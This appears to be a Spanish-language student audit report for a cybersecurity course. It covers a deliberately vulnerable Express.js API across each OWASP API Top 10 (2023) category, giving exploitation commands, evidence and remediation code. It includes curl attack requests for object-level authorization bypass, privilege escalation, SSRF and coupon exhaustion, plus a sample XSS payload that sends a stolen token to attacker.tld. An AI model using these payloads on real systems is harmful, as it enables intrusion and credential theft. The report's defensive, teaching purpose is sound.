# Informe de Auditoría y Remediación — OWASP API Security Top 10 (2023)

**Materia:** Seminario de Actualización III - Ciberseguridad  
**Institución:** Instituto Politécnico Formosa — Tecnicatura Superior en Desarrollo de Software Multiplataforma  
**Proyecto Auditado:** `parcial-express-owasp-api-t10-2023` (Express.js + TypeScript + SQLite)

---

## Índice

1. [API1:2023 - Broken Object Level Authorization (BOLA)](#api12023---broken-object-level-authorization-bola)
2. [API2:2023 - Broken Authentication](#api22023---broken-authentication)
3. [API3:2023 - Broken Object Property Level Authorization (BOPLA)](#api32023---broken-object-property-level-authorization-bopla)
4. [API4:2023 - Unrestricted Resource Consumption](#api42023---unrestricted-resource-consumption)
5. [API5:2023 - Broken Function Level Authorization (BFLA)](#api52023---broken-function-level-authorization-bfla)
6. [API6:2023 - Unrestricted Access to Sensitive Business Flows](#api62023---unrestricted-access-to-sensitive-business-flows)
7. [API7:2023 - Server-Side Request Forgery (SSRF)](#api72023---server-side-request-forgery-ssrf)
8. [API8:2023 - Security Misconfiguration](#api82023---security-misconfiguration)
9. [API9:2023 - Improper Inventory Management](#api92023---improper-inventory-management)
10. [API10:2023 - Unsafe Consumption of APIs](#api102023---unsafe-consumption-of-apis)
11. [Referencias](#referencias)

---

## API1:2023 - Broken Object Level Authorization (BOLA)

### 1. Identificación y Descripción de la Vulnerabilidad
- **Archivos afectados:** `src/controllers/usersController.ts` (funciones `getUserById`, `updateUser` y `getAccountInfo`) y `src/routes/users.ts`.
- **Descripción e impacto:** Aunque las rutas `GET /api/users/:id` y `PUT /api/users/:id` verifican que exista una sesión mediante el middleware `authenticate`, el controlador toma directamente `req.params.id` y ejecuta la consulta sobre la base de datos sin comprobar si el usuario autenticado (`req.user.id`) es el propietario del registro solicitado o si posee el rol `admin`. Adicionalmente, `GET /api/users/account/:id` ni siquiera exigía autenticación. Esto permite a cualquier usuario autenticado leer o modificar los datos de cualquier otro usuario (incluido el administrador con `id = 1`) cambiando el ID en la URL.

### 2. Proceso de Explotación
1. Registrar un usuario estándar (`POST /api/auth/register`) e iniciar sesión (`POST /api/auth/login`) para obtener su token JWT (ej. `userId: 2`).
2. Realizar una petición `GET` hacia `/api/users/1` (perteneciente al administrador) enviando el token del usuario `2`:
   ```bash
   curl -X GET http://localhost:3000/api/users/1 \
     -H "Authorization: Bearer <TOKEN_USUARIO_2>"
   ```
3. De igual forma, modificar los datos de otro usuario mediante `PUT /api/users/1`:
   ```bash
   curl -X PUT http://localhost:3000/api/users/1 \
     -H "Authorization: Bearer <TOKEN_USUARIO_2>" \
     -H "Content-Type: application/json" \
     -d '{"email": "comprometido@test.com"}'
   ```

### 3. Evidencia Verificable
Respuesta del servidor antes de la corrección al consultar `GET /api/users/1` con el token de un usuario estándar (`id = 2`):
```json
{
  "id": 1,
  "username": "admin",
  "email": "admin@example.com",
  "role": "admin",
  "profile_picture_url": null,
  "password": "admin123"
}
```

### 4. Propuesta de Mitigación Técnica
Se agregó el middleware `authenticate` a `GET /api/users/account/:id` en `src/routes/users.ts` y se implementó la validación de propiedad (`req.user.id !== requestedId && req.user.role !== 'admin'`) en `getUserById`, `updateUser` y `getAccountInfo` dentro de `src/controllers/usersController.ts`:

```typescript
// src/controllers/usersController.ts
export const getUserById = async (req: CustomRequest, res: Response) => {
  try {
    const { id } = req.params;
    const requestedId = Number(id);

    if (!req.user || (req.user.id !== requestedId && req.user.role !== 'admin')) {
      return res.status(403).json({ message: 'Acceso denegado: no tienes permisos sobre este recurso.' });
    }
    // ...
```

---

## API2:2023 - Broken Authentication

### 1. Identificación y Descripción de la Vulnerabilidad
- **Archivos afectados:** `src/controllers/authController.ts` (`JWT_SECRET`, `register`, `login`, `logout`), `src/services/Database.ts` y `src/middlewares/auth.ts`.
- **Descripción e impacto:** Se identificaron cuatro fallas críticas en el mecanismo de autenticación:
  1. **Almacenamiento de contraseñas en texto plano:** Tanto el usuario `admin` en `Database.ts` como los usuarios registrados en `register` se guardan en texto plano, y `login` compara `user.password !== password` directamente (existía además una función `hash` con MD5 sin sal que ni siquiera se utilizaba).
  2. **Secreto JWT débil y hardcodeado:** `export const JWT_SECRET = 'tu_secreto_super_secreto_y_debil'`, permitiendo falsificar tokens con cualquier rol (`role: 'admin'`).
  3. **Ausencia de protección contra fuerza bruta:** `POST /api/auth/login` permite intentos ilimitados de adivinación de contraseñas.
  4. **Logout cosmético:** `POST /api/auth/logout` devuelve éxito sin revocar el JWT en el servidor, por lo que el token continúa siendo válido hasta su expiración.

### 2. Proceso de Explotación
1. **Falsificación de Token JWT:** Conociendo el secreto débil o mediante fuerza bruta offline con `hashcat`/`john`, se firma un token con payload `{"id": 1, "role": "admin"}`.
2. **Reutilización post-logout:**
   ```bash
   curl -X POST http://localhost:3000/api/auth/logout \
     -H "Authorization: Bearer <TOKEN>"
   # El mismo token sigue funcionando en rutas protegidas:
   curl -X GET http://localhost:3000/api/users/2 \
     -H "Authorization: Bearer <TOKEN>"
   ```

### 3. Evidencia Verificable
Al invocar `POST /api/auth/logout`, el servidor respondía:
```json
{
  "message": "Sesión cerrada con éxito. El token debe ser descartado por el cliente."
}
```
Y cualquier petición posterior con el mismo encabezado `Authorization: Bearer <TOKEN>` seguía devolviendo `200 OK`.

### 4. Propuesta de Mitigación Técnica
- En `src/services/Database.ts`, se reemplazó el texto plano y MD5 por `crypto.scryptSync` con sal aleatoria de 16 bytes y comparación en tiempo constante `crypto.timingSafeEqual`.
- En `src/controllers/authController.ts`, se configuró `JWT_SECRET` desde variable de entorno con fallback criptográfico, expiración reducida a `15m`, algoritmo explícito `HS256`, bloqueo temporal tras 5 intentos fallidos (`429 Too Many Requests`) y una lista de revocación `revokedTokens` verificada en `src/middlewares/auth.ts`:

```typescript
// src/services/Database.ts
const hashPassword = (password: string): string => {
  const salt = crypto.randomBytes(16).toString("hex");
  const derivedKey = crypto.scryptSync(password, salt, 64).toString("hex");
  return `${salt}:${derivedKey}`;
};

const verifyPassword = (password: string, storedHash: string): boolean => {
  const [salt, key] = storedHash.split(":");
  if (!salt || !key) return false;
  const keyBuffer = Buffer.from(key, "hex");
  const derivedBuffer = crypto.scryptSync(password, salt, 64);
  if (keyBuffer.length !== derivedBuffer.length) return false;
  return crypto.timingSafeEqual(keyBuffer, derivedBuffer);
};
```

---

## API3:2023 - Broken Object Property Level Authorization (BOPLA)

### 1. Identificación y Descripción de la Vulnerabilidad
- **Archivo afectado:** `src/controllers/usersController.ts` (funciones `getUserById` y `updateUser`).
- **Descripción e impacto:** Combina las dos variantes de BOPLA:
  1. **Exposición Excesiva de Datos (Excessive Data Exposure):** `getUserById` ejecuta `SELECT id, username, email, role, profile_picture_url, password FROM users WHERE id = ?`, devolviendo la contraseña del usuario en la respuesta JSON.
  2. **Asignación Masiva (Mass Assignment):** `updateUser` construye dinámicamente la sentencia `UPDATE` iterando sobre todas las claves enviadas en `req.body` (`Object.keys(updateData).map(key => `${key} = ?`)`). Esto permite a un usuario estándar enviarse a sí mismo `{"role": "admin"}` y escalar privilegios a administrador.

### 2. Proceso de Explotación
1. **Exposición de `password`:**
   ```bash
   curl -X GET http://localhost:3000/api/users/2 \
     -H "Authorization: Bearer <TOKEN_USUARIO_2>"
   ```
2. **Escalación de privilegios vía Mass Assignment:**
   ```bash
   curl -X PUT http://localhost:3000/api/users/2 \
     -H "Authorization: Bearer <TOKEN_USUARIO_2>" \
     -H "Content-Type: application/json" \
     -d '{"role": "admin"}'
   ```

### 3. Evidencia Verificable
Respuesta del servidor tras el `PUT /api/users/2` con `{"role": "admin"}`:
```json
{
  "message": "User updated successfully",
  "changes": 1
}
```
Al consultar nuevamente el usuario `2`, su propiedad `role` cambió de `"user"` a `"admin"`.

### 4. Propuesta de Mitigación Técnica
En `src/controllers/usersController.ts`, se eliminó la columna `password` de `getUserById` y se implementó una lista blanca estricta (`ALLOWED_FIELDS`) en `updateUser`:

```typescript
// src/controllers/usersController.ts
const ALLOWED_FIELDS = ['username', 'email', 'profile_picture_url'] as const;
const sanitizedEntries = Object.entries(req.body || {}).filter(([key]) =>
  (ALLOWED_FIELDS as readonly string[]).includes(key)
);

if (sanitizedEntries.length === 0) {
  return res.status(400).json({
    message: 'No se proporcionaron campos válidos para actualizar. Campos permitidos: username, email, profile_picture_url.'
  });
}
```

---

## API4:2023 - Unrestricted Resource Consumption

### 1. Identificación y Descripción de la Vulnerabilidad
- **Archivos afectados:** `src/controllers/usersController.ts` (función `getAllUsers`) y `src/main.ts` (`bodyParser.json()`).
- **Descripción e impacto:** El endpoint `GET /api/users` permite consultar todos los usuarios sin paginación por defecto (si no se envía `?limit=`, devuelve la tabla completa) y sin cota máxima (un atacante puede enviar `?limit=999999999` o `?limit=-1`, lo que en SQLite devuelve todas las filas sin límite). Además, `bodyParser.json()` no limitaba el tamaño del cuerpo de las peticiones, exponiendo al servidor a ataques de denegación de servicio (DoS) por agotamiento de memoria y CPU.

### 2. Proceso de Explotación
```bash
# Volcado completo sin límite o forzando límite negativo en SQLite
curl -X GET "http://localhost:3000/api/users?limit=-1"
curl -X GET "http://localhost:3000/api/users?limit=10000000"
```

### 3. Evidencia Verificable
La API procesa la consulta sin rechazar valores negativos ni acotar el número máximo de registros devueltos, retornando el arreglo completo de usuarios en memoria.

### 4. Propuesta de Mitigación Técnica
Se limitó el tamaño del payload JSON a `10kb` en `src/main.ts` y se impuso paginación obligatoria con validación de enteros positivos y tope máximo (`MAX_LIMIT = 50`) en `src/controllers/usersController.ts`:

```typescript
// src/controllers/usersController.ts
const DEFAULT_LIMIT = 10;
const MAX_LIMIT = 50;

const rawLimit = req.query.limit !== undefined ? parseInt(req.query.limit as string, 10) : DEFAULT_LIMIT;
const rawPage = req.query.page !== undefined ? parseInt(req.query.page as string, 10) : 1;

if (Number.isNaN(rawLimit) || rawLimit <= 0 || Number.isNaN(rawPage) || rawPage <= 0) {
  return res.status(400).json({ message: 'Los parámetros "limit" y "page" deben ser enteros positivos.' });
}

const limit = Math.min(rawLimit, MAX_LIMIT);
const offset = (rawPage - 1) * limit;
```

---

## API5:2023 - Broken Function Level Authorization (BFLA)

### 1. Identificación y Descripción de la Vulnerabilidad
- **Archivo afectado:** `src/routes/users.ts`.
- **Descripción e impacto:** Las rutas administrativas `GET /api/users/admin/system-logs`, `GET /api/users/admin/users/export_all` y `DELETE /api/users/:id` solo utilizaban el middleware `authenticate`, omitiendo el middleware `checkAdminRole` (definido en `src/middlewares/auth.ts`). Como consecuencia, cualquier usuario con rol `"user"` puede acceder a los logs del sistema, exportar el padrón completo de usuarios o eliminar cualquier cuenta de la base de datos.

### 2. Proceso de Explotación
Con el token de un usuario estándar (`role: "user"`):
```bash
# 1. Leer logs administrativos del sistema
curl -X GET http://localhost:3000/api/users/admin/system-logs \
  -H "Authorization: Bearer <TOKEN_USUARIO_ESTANDAR>"

# 2. Exportar todos los usuarios
curl -X GET http://localhost:3000/api/users/admin/users/export_all \
  -H "Authorization: Bearer <TOKEN_USUARIO_ESTANDAR>"

# 3. Eliminar a otro usuario
curl -X DELETE http://localhost:3000/api/users/3 \
  -H "Authorization: Bearer <TOKEN_USUARIO_ESTANDAR>"
```

### 3. Evidencia Verificable
Respuesta de `GET /api/users/admin/system-logs` ante un usuario con `role: "user"`:
```json
{
  "logs": "Mostrando logs del sistema... Acceso concedido.",
  "user": {
    "id": 2,
    "username": "usuario_estandar",
    "role": "user"
  }
}
```

### 4. Propuesta de Mitigación Técnica
En `src/routes/users.ts`, se importó y aplicó `checkAdminRole` en todas las rutas administrativas y de gestión global:

```typescript
// src/routes/users.ts
import { authenticate, checkAdminRole } from '../middlewares/auth';

router.get('/admin/system-logs', authenticate, checkAdminRole, getSystemLogs);
router.get('/admin/users/export_all', authenticate, checkAdminRole, exportAllUsers);
router.get('/', authenticate, checkAdminRole, getAllUsers);
router.delete('/:id', authenticate, checkAdminRole, deleteUser);
```

---

## API6:2023 - Unrestricted Access to Sensitive Business Flows

### 1. Identificación y Descripción de la Vulnerabilidad
- **Archivos afectados:** `src/routes/coupons.ts` y `src/controllers/couponController.ts` (función `claimCoupon`).
- **Descripción e impacto:** El flujo de negocio `POST /api/coupons/claim` administra un inventario finito de 100 cupones promocionales (`let totalCoupons = 100`). El endpoint no requiere autenticación, no verifica si un mismo usuario ya reclamó un cupón previamente ni aplica limitación de tasa (rate limiting). Un atacante puede agotar la totalidad del stock promocional en milisegundos mediante un bucle automatizado, dejando sin cupones a los usuarios legítimos.

### 2. Proceso de Explotación
Ejecutar un bucle de 100 peticiones consecutivas sin autenticación:
```bash
for i in $(seq 1 100); do
  curl -s -X POST http://localhost:3000/api/coupons/claim
done
```

### 3. Evidencia Verificable
```json
{"message":"Coupon claimed!","coupons_left":99}
...
{"message":"Coupon claimed!","coupons_left":0}
{"message":"No more coupons left!"}
```

### 4. Propuesta de Mitigación Técnica
Se protegió la ruta con `authenticate` en `src/routes/coupons.ts`, y en `src/controllers/couponController.ts` se registró el ID de cada usuario que reclama su cupón (`claimedUsers`) permitiendo un único cupón por cuenta, además de aplicar un enfriamiento (cooldown) por IP contra automatización:

```typescript
// src/controllers/couponController.ts
if (claimedUsers.has(req.user.id)) {
  return res.status(409).json({
    message: 'Ya has reclamado tu cupón promocional. Solo se permite un cupón por usuario.'
  });
}

if (totalCoupons > 0) {
  totalCoupons--;
  claimedUsers.add(req.user.id);
  res.status(200).json({ message: 'Coupon claimed!', coupons_left: totalCoupons });
}
```

---

## API7:2023 - Server-Side Request Forgery (SSRF)

### 1. Identificación y Descripción de la Vulnerabilidad
- **Archivos afectados:** `src/controllers/usersController.ts` (función `setProfilePictureFromUrl`) y `src/routes/users.ts`.
- **Descripción e impacto:** El endpoint `POST /api/users/profile-picture` recibe un parámetro `url` en el cuerpo de la petición y realiza `await axios.get(url, { responseType: 'arraybuffer' })` desde el servidor sin exigir autenticación ni validar el esquema, el dominio o la dirección IP de destino. Esto permite a un atacante usar el servidor como proxy para escanear puertos internos, consultar servicios locales (`http://localhost:3000/health`, `http://127.0.0.1`) o extraer metadatos de nube (`http://169.254.169.254/latest/meta-data/`).

### 2. Proceso de Explotación
```bash
curl -X POST http://localhost:3000/api/users/profile-picture \
  -H "Content-Type: application/json" \
  -d '{"url": "http://127.0.0.1:3000/health"}'
```

### 3. Evidencia Verificable
Respuesta HTTP 200 y registro en consola del servidor confirmando que realizó la petición hacia sí mismo (`127.0.0.1:3000`):
```json
{
  "message": "Profile picture updated from URL."
}
```
Log en servidor: `Fetched image from http://127.0.0.1:3000/health, size: 15 bytes.`

### 4. Propuesta de Mitigación Técnica
Se exigió `authenticate` en `src/routes/users.ts` y en `setProfilePictureFromUrl` (`src/controllers/usersController.ts`) se implementó validación de esquema exclusivo `https:`, resolución DNS previa con bloqueo de rangos IPv4/IPv6 privados/loopback/link-local (`isPrivateOrInternalIP`), desactivación de redirecciones (`maxRedirects: 0`), timeout de 3 segundos y verificación de cabecera `Content-Type: image/*`:

```typescript
// src/controllers/usersController.ts
if (parsedUrl.protocol !== 'https:') {
  return res.status(400).json({ message: 'Only HTTPS URLs are allowed.' });
}

const addresses = await dns.promises.lookup(hostname, { all: true });
if (addresses.length === 0 || addresses.some(addr => isPrivateOrInternalIP(addr.address))) {
  return res.status(403).json({ message: 'URL resolves to a forbidden private or loopback IP address.' });
}
```

---

## API8:2023 - Security Misconfiguration

### 1. Identificación y Descripción de la Vulnerabilidad
- **Archivos afectados:** `src/main.ts` (manejador global de errores y cabeceras HTTP), `src/middlewares/auth.ts`, `src/controllers/authController.ts` y `src/controllers/usersController.ts`.
- **Descripción e impacto:**
  1. El manejador global de errores en `src/main.ts` devuelve `error: err.message` y `stack: err.stack` en la respuesta HTTP 500, revelando rutas absolutas del servidor, versiones de librerías (`body-parser`, `express`) y estructura interna del proyecto.
  2. Los controladores devuelven `err.message` crudo de SQLite al cliente y `searchUsers` concatena directamente `LIKE '%${query}%'` (habilitando SQL Injection y fugas de errores de sintaxis SQL).
  3. Express expone la cabecera `X-Powered-By: Express` y carece de cabeceras defensivas (`X-Content-Type-Options`, `X-Frame-Options`, `Content-Security-Policy`).

### 2. Proceso de Explotación
Enviar un cuerpo JSON malformado a cualquier ruta para disparar el manejador global de excepciones:
```bash
curl -X POST http://localhost:3000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username": "test",'
```

### 3. Evidencia Verificable
Respuesta HTTP 500 filtrando el stack trace completo del servidor:
```json
{
  "message": "Ha ocurrido un error interno en el servidor.",
  "error": "Unexpected end of JSON input",
  "stack": "SyntaxError: Unexpected end of JSON input\n    at JSON.parse (<anonymous>)\n    at parse (/home/max/Desktop/parcial-express-owasp-api-t10-2023/node_modules/body-parser/lib/types/json.js:89:19)..."
}
```

### 4. Propuesta de Mitigación Técnica
En `src/main.ts`, se deshabilitó `x-powered-by`, se agregaron cabeceras de seguridad y se eliminó la exposición de `err.message` y `err.stack` en las respuestas al cliente. Además, se parametrizó la consulta SQL en `searchUsers`:

```typescript
// src/main.ts
app.disable('x-powered-by');

app.use((req: Request, res: Response, next: NextFunction) => {
    res.setHeader('X-Content-Type-Options', 'nosniff');
    res.setHeader('X-Frame-Options', 'DENY');
    res.setHeader('Content-Security-Policy', "default-src 'none'");
    res.setHeader('Cache-Control', 'no-store');
    next();
});

app.use((err: Error, req: Request, res: Response, next: NextFunction) => {
    console.error('[Error Interno]:', err.stack);
    if (err instanceof SyntaxError && 'status' in err && (err as any).status === 400) {
        return res.status(400).json({
            message: 'El cuerpo de la petición contiene un formato JSON inválido.'
        });
    }
    res.status(500).json({
        message: 'Ha ocurrido un error interno en el servidor.'
    });
});
```

---

## API9:2023 - Improper Inventory Management

### 1. Identificación y Descripción de la Vulnerabilidad
- **Archivos afectados:** `src/main.ts` (`app.use('/api/v1/users', deprecatedUserRoutes)`) y `src/routes/users_v1_deprecated.ts`.
- **Descripción e impacto:** La aplicación mantiene montada y activa una versión antigua de la API (`/api/v1/users/:id`) en paralelo a la versión vigente (`/api/users/:id`). Esta ruta deprecada carece por completo de autenticación (`authenticate`) y de control de autorización, permitiendo enumerar usuarios y obtener sus identificadores y nombres de usuario sin ningún token.

### 2. Proceso de Explotación
Consultar directamente el endpoint heredado sin encabezados de autenticación:
```bash
curl -X GET http://localhost:3000/api/v1/users/1
```

### 3. Evidencia Verificable
Respuesta HTTP 200 sin estar autenticado:
```json
{
  "id": 1,
  "username": "admin"
}
```

### 4. Propuesta de Mitigación Técnica
Se eliminó el archivo `src/routes/users_v1_deprecated.ts` y se reemplazó el montaje en `src/main.ts` por una respuesta explícita `410 Gone` informando el retiro definitivo de la versión `v1`:

```typescript
// src/main.ts
app.use('/api/v1', (req: Request, res: Response) => {
    res.status(410).json({
        message: 'La versión v1 de la API ha sido retirada permanentemente. Utilice /api/users.'
    });
});
```

---

## API10:2023 - Unsafe Consumption of APIs

### 1. Identificación y Descripción de la Vulnerabilidad
- **Archivo afectado:** `src/controllers/authController.ts` (función `register`).
- **Descripción e impacto:** Durante el registro de un usuario, la aplicación consume el servicio externo `https://fictional-geo-api.com/email-to-country?email=${email}`:
  1. Interpola `email` en la URL sin codificar (`encodeURIComponent`).
  2. No establece timeouts ni límites de tamaño de respuesta en la llamada `axios.get`.
  3. Confía ciegamente en `geoResponse.data`: inserta `countryData.profile_picture_url` directamente en la tabla `users` sin validar tipo, longitud ni protocolo (permitiendo inyectar esquemas `javascript:` para Stored XSS o URLs internas para SSRF secundario), y reenvía el objeto `countryData` completo sin filtrar en la respuesta JSON al cliente.

### 2. Proceso de Explotación (Vector de Ataque frente al Proveedor Externo)
Si el servicio externo `fictional-geo-api.com` es comprometido o interceptado y devuelve un payload malicioso como:
```json
{
  "country": "<script>alert(1)</script>",
  "profile_picture_url": "javascript:fetch('https://attacker.tld/steal?t='+localStorage.getItem('token'))",
  "internal_debug_dump": "datos_no_esperados"
}
```
La aplicación almacena el payload `javascript:...` en la columna `profile_picture_url` del usuario creado y refleja todo el JSON malicioso en la respuesta `201 Created`.

### 3. Evidencia Verificable
En el código original de `src/controllers/authController.ts`:
```typescript
const geoResponse = await axios.get(`https://fictional-geo-api.com/email-to-country?email=${email}`);
countryData = geoResponse.data;
// ...
db.run(sql, [username, password, email, 'user', countryData.profile_picture_url], function (err) {
  res.status(201).json({ message: 'User created', userId: this.lastID, data: countryData });
});
```

### 4. Propuesta de Mitigación Técnica
En `src/controllers/authController.ts`, se codificó el parámetro con `encodeURIComponent`, se añadieron límites de tiempo (`timeout: 2500`), tamaño (`maxContentLength: 10240`) y redirecciones (`maxRedirects: 0`), y se implementaron las funciones de sanitización `sanitizeExternalProfileUrl` y `sanitizeCountryName` antes de almacenar en SQLite o responder al cliente:

```typescript
// src/controllers/authController.ts
const sanitizeExternalProfileUrl = (rawUrl: unknown): string | null => {
  if (typeof rawUrl !== 'string' || rawUrl.length === 0 || rawUrl.length > 255) {
    return null;
  }
  try {
    const parsed = new URL(rawUrl);
    if (parsed.protocol !== 'https:') return null;
    const hostname = parsed.hostname.toLowerCase();
    if (
      hostname === 'localhost' ||
      hostname === '127.0.0.1' ||
      hostname === '::1' ||
      hostname.endsWith('.local') ||
      hostname.endsWith('.internal')
    ) {
      return null;
    }
    return parsed.toString();
  } catch {
    return null;
  }
};
```

---

## Referencias

- OWASP Foundation. (2023). *OWASP API Security Top 10 2023*. https://owasp.org/API-Security/editions/2023/en/0x11-t10/
- Express.js Documentation. *Production Best Practices: Security*. https://expressjs.com/en/advanced/best-practice-security.html
- Node.js Documentation. *Crypto module (`scryptSync`, `timingSafeEqual`)*. https://nodejs.org/api/crypto.html
